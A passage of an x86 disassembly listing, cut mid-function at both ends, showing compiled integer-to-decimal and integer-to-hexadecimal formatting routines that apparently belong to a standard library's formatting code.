  4036e8:	b8 0a 00 00 00       	mov    $0xa,%eax
  4036ed:	81 fe e8 03 00 00    	cmp    $0x3e8,%esi
  4036f3:	0f 82 c8 00 00 00    	jb     0x4037c1
  4036f9:	bb 0a 00 00 00       	mov    $0xa,%ebx
  4036fe:	66 90                	xchg   %ax,%ax
  403700:	89 f0                	mov    %esi,%eax
  403702:	b9 59 17 b7 d1       	mov    $0xd1b71759,%ecx
  403707:	f7 e1                	mul    %ecx
  403709:	89 f1                	mov    %esi,%ecx
  40370b:	c1 ea 0d             	shr    $0xd,%edx
  40370e:	69 c2 10 27 00 00    	imul   $0x2710,%edx,%eax
  403714:	29 c1                	sub    %eax,%ecx
  403716:	69 c1 7b 14 00 00    	imul   $0x147b,%ecx,%eax
  40371c:	c1 e8 13             	shr    $0x13,%eax
  40371f:	6b f8 64             	imul   $0x64,%eax,%edi
  403722:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403729:	00 
  40372a:	29 f9                	sub    %edi,%ecx
  40372c:	81 fe 7f 96 98 00    	cmp    $0x98967f,%esi
  403732:	89 d6                	mov    %edx,%esi
  403734:	66 89 44 1d e2       	mov    %ax,-0x1e(%ebp,%ebx,1)
  403739:	0f b7 c1             	movzwl %cx,%eax
  40373c:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403743:	00 
  403744:	66 89 44 1d e4       	mov    %ax,-0x1c(%ebp,%ebx,1)
  403749:	8d 43 fc             	lea    -0x4(%ebx),%eax
  40374c:	89 c3                	mov    %eax,%ebx
  40374e:	77 b0                	ja     0x403700
  403750:	83 fa 09             	cmp    $0x9,%edx
  403753:	76 29                	jbe    0x40377e
  403755:	0f b7 ca             	movzwl %dx,%ecx
  403758:	c1 e9 02             	shr    $0x2,%ecx
  40375b:	69 c9 7b 14 00 00    	imul   $0x147b,%ecx,%ecx
  403761:	c1 e9 11             	shr    $0x11,%ecx
  403764:	6b f1 64             	imul   $0x64,%ecx,%esi
  403767:	29 f2                	sub    %esi,%edx
  403769:	0f b7 d2             	movzwl %dx,%edx
  40376c:	0f b7 94 12 78 3c 43 	movzwl 0x433c78(%edx,%edx,1),%edx
  403773:	00 
  403774:	66 89 54 05 e4       	mov    %dx,-0x1c(%ebp,%eax,1)
  403779:	83 c0 fe             	add    $0xfffffffe,%eax
  40377c:	89 ca                	mov    %ecx,%edx
  40377e:	8b 75 f0             	mov    -0x10(%ebp),%esi
  403781:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403784:	85 f6                	test   %esi,%esi
  403786:	74 04                	je     0x40378c
  403788:	85 d2                	test   %edx,%edx
  40378a:	74 10                	je     0x40379c
  40378c:	83 e2 0f             	and    $0xf,%edx
  40378f:	0f b6 94 12 79 3c 43 	movzbl 0x433c79(%edx,%edx,1),%edx
  403796:	00 
  403797:	88 54 05 e5          	mov    %dl,-0x1b(%ebp,%eax,1)
  40379b:	48                   	dec    %eax
  40379c:	ba 0a 00 00 00       	mov    $0xa,%edx
  4037a1:	f7 d6                	not    %esi
  4037a3:	29 c2                	sub    %eax,%edx
  4037a5:	8d 44 05 e6          	lea    -0x1a(%ebp,%eax,1),%eax
  4037a9:	c1 ee 1f             	shr    $0x1f,%esi
  4037ac:	52                   	push   %edx
  4037ad:	50                   	push   %eax
  4037ae:	6a 00                	push   $0x0
  4037b0:	6a 01                	push   $0x1
  4037b2:	56                   	push   %esi
  4037b3:	51                   	push   %ecx
  4037b4:	e8 c7 09 00 00       	call   0x404180
  4037b9:	83 c4 28             	add    $0x28,%esp
  4037bc:	5e                   	pop    %esi
  4037bd:	5f                   	pop    %edi
  4037be:	5b                   	pop    %ebx
  4037bf:	5d                   	pop    %ebp
  4037c0:	c3                   	ret
  4037c1:	89 f2                	mov    %esi,%edx
  4037c3:	83 fa 09             	cmp    $0x9,%edx
  4037c6:	77 8d                	ja     0x403755
  4037c8:	eb b4                	jmp    0x40377e
  4037ca:	cc                   	int3
  4037cb:	cc                   	int3
  4037cc:	cc                   	int3
  4037cd:	cc                   	int3
  4037ce:	cc                   	int3
  4037cf:	cc                   	int3
  4037d0:	55                   	push   %ebp
  4037d1:	89 e5                	mov    %esp,%ebp
  4037d3:	53                   	push   %ebx
  4037d4:	57                   	push   %edi
  4037d5:	56                   	push   %esi
  4037d6:	83 ec 10             	sub    $0x10,%esp
  4037d9:	8b 45 08             	mov    0x8(%ebp),%eax
  4037dc:	8b 10                	mov    (%eax),%edx
  4037de:	b8 0a 00 00 00       	mov    $0xa,%eax
  4037e3:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
  4037e9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4037ec:	72 62                	jb     0x403850
  4037ee:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4037f1:	bb 0a 00 00 00       	mov    $0xa,%ebx
  4037f6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4037fd:	00 00 00 
  403800:	89 f0                	mov    %esi,%eax
  403802:	b9 59 17 b7 d1       	mov    $0xd1b71759,%ecx
  403807:	f7 e1                	mul    %ecx
  403809:	89 f1                	mov    %esi,%ecx
  40380b:	c1 ea 0d             	shr    $0xd,%edx
  40380e:	69 c2 10 27 00 00    	imul   $0x2710,%edx,%eax
  403814:	29 c1                	sub    %eax,%ecx
  403816:	69 c1 7b 14 00 00    	imul   $0x147b,%ecx,%eax
  40381c:	c1 e8 13             	shr    $0x13,%eax
  40381f:	6b f8 64             	imul   $0x64,%eax,%edi
  403822:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403829:	00 
  40382a:	29 f9                	sub    %edi,%ecx
  40382c:	81 fe 7f 96 98 00    	cmp    $0x98967f,%esi
  403832:	89 d6                	mov    %edx,%esi
  403834:	66 89 44 1d e2       	mov    %ax,-0x1e(%ebp,%ebx,1)
  403839:	0f b7 c1             	movzwl %cx,%eax
  40383c:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403843:	00 
  403844:	66 89 44 1d e4       	mov    %ax,-0x1c(%ebp,%ebx,1)
  403849:	8d 43 fc             	lea    -0x4(%ebx),%eax
  40384c:	89 c3                	mov    %eax,%ebx
  40384e:	77 b0                	ja     0x403800
  403850:	83 fa 09             	cmp    $0x9,%edx
  403853:	76 29                	jbe    0x40387e
  403855:	0f b7 ca             	movzwl %dx,%ecx
  403858:	c1 e9 02             	shr    $0x2,%ecx
  40385b:	69 c9 7b 14 00 00    	imul   $0x147b,%ecx,%ecx
  403861:	c1 e9 11             	shr    $0x11,%ecx
  403864:	6b f1 64             	imul   $0x64,%ecx,%esi
  403867:	29 f2                	sub    %esi,%edx
  403869:	0f b7 d2             	movzwl %dx,%edx
  40386c:	0f b7 94 12 78 3c 43 	movzwl 0x433c78(%edx,%edx,1),%edx
  403873:	00 
  403874:	66 89 54 05 e4       	mov    %dx,-0x1c(%ebp,%eax,1)
  403879:	83 c0 fe             	add    $0xfffffffe,%eax
  40387c:	89 ca                	mov    %ecx,%edx
  40387e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403881:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  403885:	74 04                	je     0x40388b
  403887:	85 d2                	test   %edx,%edx
  403889:	74 10                	je     0x40389b
  40388b:	83 e2 0f             	and    $0xf,%edx
  40388e:	0f b6 94 12 79 3c 43 	movzbl 0x433c79(%edx,%edx,1),%edx
  403895:	00 
  403896:	88 54 05 e5          	mov    %dl,-0x1b(%ebp,%eax,1)
  40389a:	48                   	dec    %eax
  40389b:	ba 0a 00 00 00       	mov    $0xa,%edx
  4038a0:	29 c2                	sub    %eax,%edx
  4038a2:	8d 44 05 e6          	lea    -0x1a(%ebp,%eax,1),%eax
  4038a6:	52                   	push   %edx
  4038a7:	50                   	push   %eax
  4038a8:	6a 00                	push   $0x0
  4038aa:	6a 01                	push   $0x1
  4038ac:	6a 01                	push   $0x1
  4038ae:	51                   	push   %ecx
  4038af:	e8 cc 08 00 00       	call   0x404180
  4038b4:	83 c4 28             	add    $0x28,%esp
  4038b7:	5e                   	pop    %esi
  4038b8:	5f                   	pop    %edi
  4038b9:	5b                   	pop    %ebx
  4038ba:	5d                   	pop    %ebp
  4038bb:	c3                   	ret
  4038bc:	cc                   	int3
  4038bd:	cc                   	int3
  4038be:	cc                   	int3
  4038bf:	cc                   	int3
  4038c0:	55                   	push   %ebp
  4038c1:	89 e5                	mov    %esp,%ebp
  4038c3:	53                   	push   %ebx
  4038c4:	57                   	push   %edi
  4038c5:	56                   	push   %esi
  4038c6:	83 ec 28             	sub    $0x28,%esp
  4038c9:	8b 45 08             	mov    0x8(%ebp),%eax
  4038cc:	bf 14 00 00 00       	mov    $0x14,%edi
  4038d1:	8b 08                	mov    (%eax),%ecx
  4038d3:	8b 50 04             	mov    0x4(%eax),%edx
  4038d6:	81 f9 e8 03 00 00    	cmp    $0x3e8,%ecx
  4038dc:	89 d0                	mov    %edx,%eax
  4038de:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4038e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4038e4:	83 d8 00             	sbb    $0x0,%eax
  4038e7:	89 c8                	mov    %ecx,%eax
  4038e9:	0f 82 83 00 00 00    	jb     0x403972
  4038ef:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4038f2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4038f5:	be 14 00 00 00       	mov    $0x14,%esi
  4038fa:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  403900:	8d 46 fc             	lea    -0x4(%esi),%eax
  403903:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403906:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403909:	6a 00                	push   $0x0
  40390b:	68 10 27 00 00       	push   $0x2710
  403910:	51                   	push   %ecx
  403911:	53                   	push   %ebx
  403912:	e8 e9 ee 01 00       	call   0x422800
  403917:	69 f8 10 27 00 00    	imul   $0x2710,%eax,%edi
  40391d:	89 d9                	mov    %ebx,%ecx
  40391f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403922:	29 f9                	sub    %edi,%ecx
  403924:	0f b7 c1             	movzwl %cx,%eax
  403927:	c1 e8 02             	shr    $0x2,%eax
  40392a:	69 c0 7b 14 00 00    	imul   $0x147b,%eax,%eax
  403930:	c1 e8 11             	shr    $0x11,%eax
  403933:	6b f8 64             	imul   $0x64,%eax,%edi
  403936:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  40393d:	00 
  40393e:	29 f9                	sub    %edi,%ecx
  403940:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  403943:	66 89 44 35 c8       	mov    %ax,-0x38(%ebp,%esi,1)
  403948:	0f b7 c1             	movzwl %cx,%eax
  40394b:	89 d1                	mov    %edx,%ecx
  40394d:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403954:	00 
  403955:	66 89 44 35 ca       	mov    %ax,-0x36(%ebp,%esi,1)
  40395a:	b8 7f 96 98 00       	mov    $0x98967f,%eax
  40395f:	89 fe                	mov    %edi,%esi
  403961:	39 d8                	cmp    %ebx,%eax
  403963:	b8 00 00 00 00       	mov    $0x0,%eax
  403968:	1b 45 e0             	sbb    -0x20(%ebp),%eax
  40396b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40396e:	89 c3                	mov    %eax,%ebx
  403970:	72 8e                	jb     0x403900
  403972:	be 09 00 00 00       	mov    $0x9,%esi
  403977:	31 c9                	xor    %ecx,%ecx
  403979:	39 c6                	cmp    %eax,%esi
  40397b:	be 00 00 00 00       	mov    $0x0,%esi
  403980:	19 d6                	sbb    %edx,%esi
  403982:	89 c6                	mov    %eax,%esi
  403984:	73 2b                	jae    0x4039b1
  403986:	0f b7 c6             	movzwl %si,%eax
  403989:	c1 e8 02             	shr    $0x2,%eax
  40398c:	69 c0 7b 14 00 00    	imul   $0x147b,%eax,%eax
  403992:	c1 e8 11             	shr    $0x11,%eax
  403995:	6b d0 64             	imul   $0x64,%eax,%edx
  403998:	29 d6                	sub    %edx,%esi
  40399a:	0f b7 d6             	movzwl %si,%edx
  40399d:	89 c6                	mov    %eax,%esi
  40399f:	0f b7 94 12 78 3c 43 	movzwl 0x433c78(%edx,%edx,1),%edx
  4039a6:	00 
  4039a7:	66 89 54 3d ca       	mov    %dx,-0x36(%ebp,%edi,1)
  4039ac:	83 c7 fe             	add    $0xfffffffe,%edi
  4039af:	eb 02                	jmp    0x4039b3
  4039b1:	89 d1                	mov    %edx,%ecx
  4039b3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4039b6:	8b 55 0c             	mov    0xc(%ebp),%edx
  4039b9:	09 45 ec             	or     %eax,-0x14(%ebp)
  4039bc:	74 04                	je     0x4039c2
  4039be:	09 f1                	or     %esi,%ecx
  4039c0:	74 10                	je     0x4039d2
  4039c2:	83 e6 0f             	and    $0xf,%esi
  4039c5:	0f b6 84 36 79 3c 43 	movzbl 0x433c79(%esi,%esi,1),%eax
  4039cc:	00 
  4039cd:	88 44 3d cb          	mov    %al,-0x35(%ebp,%edi,1)
  4039d1:	4f                   	dec    %edi
  4039d2:	b8 14 00 00 00       	mov    $0x14,%eax
  4039d7:	8d 4c 3d cc          	lea    -0x34(%ebp,%edi,1),%ecx
  4039db:	29 f8                	sub    %edi,%eax
  4039dd:	50                   	push   %eax
  4039de:	51                   	push   %ecx
  4039df:	6a 00                	push   $0x0
  4039e1:	6a 01                	push   $0x1
  4039e3:	6a 01                	push   $0x1
  4039e5:	52                   	push   %edx
  4039e6:	e8 95 07 00 00       	call   0x404180
  4039eb:	83 c4 40             	add    $0x40,%esp
  4039ee:	5e                   	pop    %esi
  4039ef:	5f                   	pop    %edi
  4039f0:	5b                   	pop    %ebx
  4039f1:	5d                   	pop    %ebp
  4039f2:	c3                   	ret
  4039f3:	cc                   	int3
  4039f4:	cc                   	int3
  4039f5:	cc                   	int3
  4039f6:	cc                   	int3
  4039f7:	cc                   	int3
  4039f8:	cc                   	int3
  4039f9:	cc                   	int3
  4039fa:	cc                   	int3
  4039fb:	cc                   	int3
  4039fc:	cc                   	int3
  4039fd:	cc                   	int3
  4039fe:	cc                   	int3
  4039ff:	cc                   	int3
  403a00:	55                   	push   %ebp
  403a01:	89 e5                	mov    %esp,%ebp
  403a03:	53                   	push   %ebx
  403a04:	57                   	push   %edi
  403a05:	56                   	push   %esi
  403a06:	83 ec 14             	sub    $0x14,%esp
  403a09:	8b 42 08             	mov    0x8(%edx),%eax
  403a0c:	a9 00 00 00 02       	test   $0x2000000,%eax
  403a11:	0f 85 da 00 00 00    	jne    0x403af1
  403a17:	a9 00 00 00 04       	test   $0x4000000,%eax
  403a1c:	0f 85 fb 00 00 00    	jne    0x403b1d
  403a22:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  403a25:	8b 11                	mov    (%ecx),%edx
  403a27:	b8 0a 00 00 00       	mov    $0xa,%eax
  403a2c:	81 fa e8 03 00 00    	cmp    $0x3e8,%edx
  403a32:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403a35:	72 59                	jb     0x403a90
  403a37:	8b 75 e0             	mov    -0x20(%ebp),%esi
  403a3a:	bf 0a 00 00 00       	mov    $0xa,%edi
  403a3f:	90                   	nop
  403a40:	89 f0                	mov    %esi,%eax
  403a42:	b9 59 17 b7 d1       	mov    $0xd1b71759,%ecx
  403a47:	f7 e1                	mul    %ecx
  403a49:	89 f1                	mov    %esi,%ecx
  403a4b:	c1 ea 0d             	shr    $0xd,%edx
  403a4e:	69 c2 10 27 00 00    	imul   $0x2710,%edx,%eax
  403a54:	29 c1                	sub    %eax,%ecx
  403a56:	69 c1 7b 14 00 00    	imul   $0x147b,%ecx,%eax
  403a5c:	c1 e8 13             	shr    $0x13,%eax
  403a5f:	6b d8 64             	imul   $0x64,%eax,%ebx
  403a62:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403a69:	00 
  403a6a:	29 d9                	sub    %ebx,%ecx
  403a6c:	81 fe 7f 96 98 00    	cmp    $0x98967f,%esi
  403a72:	89 d6                	mov    %edx,%esi
  403a74:	66 89 44 3d e6       	mov    %ax,-0x1a(%ebp,%edi,1)
  403a79:	0f b7 c1             	movzwl %cx,%eax
  403a7c:	0f b7 84 00 78 3c 43 	movzwl 0x433c78(%eax,%eax,1),%eax
  403a83:	00 
  403a84:	66 89 44 3d e8       	mov    %ax,-0x18(%ebp,%edi,1)
  403a89:	8d 47 fc             	lea    -0x4(%edi),%eax
  403a8c:	89 c7                	mov    %eax,%edi
  403a8e:	77 b0                	ja     0x403a40
  403a90:	83 fa 09             	cmp    $0x9,%edx
  403a93:	76 29                	jbe    0x403abe
  403a95:	0f b7 ca             	movzwl %dx,%ecx
  403a98:	c1 e9 02             	shr    $0x2,%ecx
  403a9b:	69 c9 7b 14 00 00    	imul   $0x147b,%ecx,%ecx
  403aa1:	c1 e9 11             	shr    $0x11,%ecx
  403aa4:	6b f1 64             	imul   $0x64,%ecx,%esi
  403aa7:	29 f2                	sub    %esi,%edx
  403aa9:	0f b7 d2             	movzwl %dx,%edx
  403aac:	0f b7 94 12 78 3c 43 	movzwl 0x433c78(%edx,%edx,1),%edx
  403ab3:	00 
  403ab4:	66 89 54 05 e8       	mov    %dx,-0x18(%ebp,%eax,1)
  403ab9:	83 c0 fe             	add    $0xfffffffe,%eax
  403abc:	89 ca                	mov    %ecx,%edx
  403abe:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403ac1:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  403ac5:	74 04                	je     0x403acb
  403ac7:	85 d2                	test   %edx,%edx
  403ac9:	74 10                	je     0x403adb
  403acb:	83 e2 0f             	and    $0xf,%edx
  403ace:	0f b6 94 12 79 3c 43 	movzbl 0x433c79(%edx,%edx,1),%edx
  403ad5:	00 
  403ad6:	88 54 05 e9          	mov    %dl,-0x17(%ebp,%eax,1)
  403ada:	48                   	dec    %eax
  403adb:	ba 0a 00 00 00       	mov    $0xa,%edx
  403ae0:	29 c2                	sub    %eax,%edx
  403ae2:	8d 44 05 ea          	lea    -0x16(%ebp,%eax,1),%eax
  403ae6:	52                   	push   %edx
  403ae7:	50                   	push   %eax
  403ae8:	6a 00                	push   $0x0
  403aea:	6a 01                	push   $0x1
  403aec:	6a 01                	push   $0x1
  403aee:	51                   	push   %ecx
  403aef:	eb 6c                	jmp    0x403b5d
  403af1:	8b 09                	mov    (%ecx),%ecx
  403af3:	31 c0                	xor    %eax,%eax
  403af5:	89 ce                	mov    %ecx,%esi
  403af7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403afe:	00 00 
  403b00:	89 cf                	mov    %ecx,%edi
  403b02:	c1 ee 04             	shr    $0x4,%esi
  403b05:	83 e7 0f             	and    $0xf,%edi
  403b08:	0f b6 9f 40 3d 43 00 	movzbl 0x433d40(%edi),%ebx
  403b0f:	88 5c 05 f1          	mov    %bl,-0xf(%ebp,%eax,1)
  403b13:	48                   	dec    %eax
  403b14:	83 f9 0f             	cmp    $0xf,%ecx
  403b17:	89 f1                	mov    %esi,%ecx
  403b19:	77 e5                	ja     0x403b00
  403b1b:	eb 2e                	jmp    0x403b4b
  403b1d:	8b 09                	mov    (%ecx),%ecx
  403b1f:	31 c0                	xor    %eax,%eax
  403b21:	89 ce                	mov    %ecx,%esi
  403b23:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403b2a:	00 00 00 
  403b2d:	0f 1f 00             	nopl   (%eax)
  403b30:	89 cf                	mov    %ecx,%edi
  403b32:	c1 ee 04             	shr    $0x4,%esi
  403b35:	83 e7 0f             	and    $0xf,%edi
  403b38:	0f b6 9f 50 3d 43 00 	movzbl 0x433d50(%edi),%ebx
  403b3f:	88 5c 05 f1          	mov    %bl,-0xf(%ebp,%eax,1)
  403b43:	48                   	dec    %eax
  403b44:	83 f9 0f             	cmp    $0xf,%ecx
  403b47:	89 f1                	mov    %esi,%ecx
  403b49:	77 e5                	ja     0x403b30
  403b4b:	8d 4c 05 f2          	lea    -0xe(%ebp,%eax,1),%ecx
  403b4f:	f7 d8                	neg    %eax
  403b51:	50                   	push   %eax
  403b52:	51                   	push   %ecx
  403b53:	6a 02                	push   $0x2
  403b55:	68 38 3c 43 00       	push   $0x433c38
  403b5a:	6a 01                	push   $0x1
  403b5c:	52                   	push   %edx
  403b5d:	e8 1e 06 00 00       	call   0x404180
  403b62:	83 c4 18             	add    $0x18,%esp
  403b65:	83 c4 14             	add    $0x14,%esp
  403b68:	5e                   	pop    %esi
  403b69:	5f                   	pop    %edi
  403b6a:	5b                   	pop    %ebx
  403b6b:	5d                   	pop    %ebp
  403b6c:	c3                   	ret
  403b6d:	cc                   	int3
  403b6e:	cc                   	int3
  403b6f:	cc                   	int3
  403b70:	55                   	push   %ebp
  403b71:	89 e5                	mov    %esp,%ebp
  403b73:	53                   	push   %ebx
  403b74:	56                   	push   %esi
  403b75:	50                   	push   %eax
  403b76:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403b79:	8b 45 0c             	mov    0xc(%ebp),%eax
  403b7c:	0f b6 11             	movzbl (%ecx),%edx
  403b7f:	31 c9                	xor    %ecx,%ecx
  403b81:	88 d6                	mov    %dl,%dh
  403b83:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403b8a:	00 00 00 
  403b8d:	0f 1f 00             	nopl   (%eax)
  403b90:	0f b6 f2             	movzbl %dl,%esi
  403b93:	c0 ee 04             	shr    $0x4,%dh
  403b96:	83 e6 0f             	and    $0xf,%esi
  403b99:	0f b6 9e 40 3d 43 00 	movzbl 0x433d40(%esi),%ebx
  403ba0:	88 5c 0d f7          	mov    %bl,-0x9(%ebp,%ecx,1)
  403ba4:	49                   	dec    %ecx
  403ba5:	80 fa 0f             	cmp    $0xf,%dl
  403ba8:	88 f2                	mov    %dh,%dl
  403baa:	77 e4                	ja     0x403b90
  403bac:	8d 54 0d f8          	lea    -0x8(%ebp,%ecx,1),%edx
  403bb0:	f7 d9                	neg    %ecx
  403bb2:	51                   	push   %ecx
  403bb3:	52                   	push   %edx
  403bb4:	6a 02                	push   $0x2
  403bb6:	68 38 3c 43 00       	push   $0x433c38
  403bbb:	6a 01                	push   $0x1
  403bbd:	50                   	push   %eax
  403bbe:	e8 bd 05 00 00       	call   0x404180
  403bc3:	83 c4 1c             	add    $0x1c,%esp
  403bc6:	5e                   	pop    %esi
  403bc7:	5b                   	pop    %ebx
  403bc8:	5d                   	pop    %ebp
  403bc9:	c3                   	ret
  403bca:	cc                   	int3
  403bcb:	cc                   	int3
  403bcc:	cc                   	int3
  403bcd:	cc                   	int3
  403bce:	cc                   	int3
  403bcf:	cc                   	int3
  403bd0:	55                   	push   %ebp
  403bd1:	89 e5                	mov    %esp,%ebp
  403bd3:	53                   	push   %ebx
  403bd4:	56                   	push   %esi
  403bd5:	50                   	push   %eax
  403bd6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403bd9:	8b 45 0c             	mov    0xc(%ebp),%eax
  403bdc:	0f b6 11             	movzbl (%ecx),%edx
  403bdf:	31 c9                	xor    %ecx,%ecx
  403be1:	88 d6                	mov    %dl,%dh
  403be3:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403bea:	00 00 00 
  403bed:	0f 1f 00             	nopl   (%eax)
  403bf0:	0f b6 f2             	movzbl %dl,%esi
  403bf3:	c0 ee 04             	shr    $0x4,%dh
  403bf6:	83 e6 0f             	and    $0xf,%esi
  403bf9:	0f b6 9e 50 3d 43 00 	movzbl 0x433d50(%esi),%ebx
  403c00:	88 5c 0d f7          	mov    %bl,-0x9(%ebp,%ecx,1)
  403c04:	49                   	dec    %ecx
  403c05:	80 fa 0f             	cmp    $0xf,%dl
  403c08:	88 f2                	mov    %dh,%dl
  403c0a:	77 e4                	ja     0x403bf0
  403c0c:	8d 54 0d f8          	lea    -0x8(%ebp,%ecx,1),%edx
  403c10:	f7 d9                	neg    %ecx
  403c12:	51                   	push   %ecx
  403c13:	52                   	push   %edx
  403c14:	6a 02                	push   $0x2
  403c16:	68 38 3c 43 00       	push   $0x433c38
  403c1b:	6a 01                	push   $0x1
  403c1d:	50                   	push   %eax
  403c1e:	e8 5d 05 00 00       	call   0x404180
  403c23:	83 c4 1c             	add    $0x1c,%esp
  403c26:	5e                   	pop    %esi
  403c27:	5b                   	pop    %ebx
  403c28:	5d                   	pop    %ebp
  403c29:	c3                   	ret
  403c2a:	cc                   	int3
  403c2b:	cc                   	int3
  403c2c:	cc                   	int3
  403c2d:	cc                   	int3
  403c2e:	cc                   	int3
  403c2f:	cc                   	int3
  403c30:	55                   	push   %ebp
  403c31:	89 e5                	mov    %esp,%ebp
  403c33:	53                   	push   %ebx
  403c34:	57                   	push   %edi
  403c35:	56                   	push   %esi
  403c36:	83 ec 10             	sub    $0x10,%esp
  403c39:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c3c:	8b 79 04             	mov    0x4(%ecx),%edi
  403c3f:	8b 01                	mov    (%ecx),%eax
  403c41:	31 c9                	xor    %ecx,%ecx
  403c43:	89 fb                	mov    %edi,%ebx
  403c45:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403c4c:	00 00 00 
  403c4f:	90                   	nop
  403c50:	89 c6                	mov    %eax,%esi
  403c52:	c1 eb 04             	shr    $0x4,%ebx
  403c55:	83 e6 0f             	and    $0xf,%esi
  403c58:	0f b6 96 40 3d 43 00 	movzbl 0x433d40(%esi),%edx
  403c5f:	be 0f 00 00 00       	mov    $0xf,%esi
  403c64:	88 54 0d f3          	mov    %dl,-0xd(%ebp,%ecx,1)
  403c68:	89 fa                	mov    %edi,%edx
  403c6a:	49                   	dec    %ecx
  403c6b:	0f a4 c2 1c          	shld   $0x1c,%eax,%edx
  403c6f:	39 c6                	cmp    %eax,%esi
  403c71:	b8 00 00 00 00       	mov    $0x0,%eax
  403c76:	19 f8                	sbb    %edi,%eax
  403c78:	89 d0                	mov    %edx,%eax
  403c7a:	89 df                	mov    %ebx,%edi
  403c7c:	72 d2                	jb     0x403c50
  403c7e:	8d 44 0d f4          	lea    -0xc(%ebp,%ecx,1),%eax
  403c82:	f7 d9                	neg    %ecx
  403c84:	51                   	push   %ecx
  403c85:	50                   	push   %eax
  403c86:	6a 02                	push   $0x2
  403c88:	68 38 3c 43 00       	push   $0x433c38
  403c8d:	6a 01                	push   $0x1
  403c8f:	ff 75 0c             	push   0xc(%ebp)
  403c92:	e8 e9 04 00 00       	call   0x404180
  403c97:	83 c4 28             	add    $0x28,%esp
  403c9a:	5e                   	pop    %esi
  403c9b:	5f                   	pop    %edi
  403c9c:	5b                   	pop    %ebx
  403c9d:	5d                   	pop    %ebp
  403c9e:	c3                   	ret
  403c9f:	cc                   	int3
  403ca0:	55                   	push   %ebp
  403ca1:	89 e5                	mov    %esp,%ebp
  403ca3:	53                   	push   %ebx
  403ca4:	57                   	push   %edi
  403ca5:	56                   	push   %esi
  403ca6:	83 ec 08             	sub    $0x8,%esp
  403ca9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403cac:	8b 45 0c             	mov    0xc(%ebp),%eax
  403caf:	8b 11                	mov    (%ecx),%edx
  403cb1:	31 c9                	xor    %ecx,%ecx
  403cb3:	89 d6                	mov    %edx,%esi
  403cb5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  403cbc:	00 00 00 
  403cbf:	90                   	nop
  403cc0:	89 d7                	mov    %edx,%edi
  403cc2:	c1 ee 04             	shr    $0x4,%esi
  403cc5:	83 e7 0f             	and    $0xf,%edi
  403cc8:	0f b6 9f 50 3d 43 00 	movzbl 0x433d50(%edi),%ebx
  403ccf:	88 5c 0d f3          	mov    %bl,-0xd(%ebp,%ecx,1)
  403cd3:	49                   	dec    %ecx
  403cd4:	83 fa 0f             	cmp    $0xf,%edx
  403cd7:	89 f2                	mov    %esi,%edx
  403cd9:	77 e5                	ja     0x403cc0
  403cdb:	8d 54 0d f4          	lea    -0xc(%ebp,%ecx,1),%edx
  403cdf:	f7 d9                	neg    %ecx
  403ce1:	51                   	push   %ecx
  403ce2:	52                   	push   %edx
  403ce3:	6a 02                	push   $0x2
  403ce5:	68 38 3c 43 00       	push   $0x433c38
  403cea:	6a 01                	push   $0x1
  403cec:	50                   	push   %eax
  403ced:	e8 8e 04 00 00       	call   0x404180
  403cf2:	83 c4 20             	add    $0x20,%esp
  403cf5:	5e                   	pop    %esi
  403cf6:	5f                   	pop    %edi
  403cf7:	5b                   	pop    %ebx
  403cf8:	5d                   	pop    %ebp
  403cf9:	c3                   	ret
  403cfa:	cc                   	int3
  403cfb:	cc                   	int3
  403cfc:	cc                   	int3
  403cfd:	cc                   	int3
  403cfe:	cc                   	int3
  403cff:	cc                   	int3
  403d00:	55                   	push   %ebp
  403d01:	89 e5                	mov    %esp,%ebp
  403d03:	ff 75 0c             	push   0xc(%ebp)
  403d06:	68 6c 3d 43 00       	push   $0x433d6c
  403d0b:	ff 75 08             	push   0x8(%ebp)
  403d0e:	e8 0d 00 00 00       	call   0x403d20
  403d13:	83 c4 0c             	add    $0xc,%esp
  403d16:	5d                   	pop    %ebp
  403d17:	c3                   	ret
  403d18:	cc                   	int3
  403d19:	cc                   	int3
  403d1a:	cc                   	int3
  403d1b:	cc                   	int3
  403d1c:	cc                   	int3
  403d1d:	cc                   	int3
  403d1e:	cc                   	int3
  403d1f:	cc                   	int3
  403d20:	55                   	push   %ebp
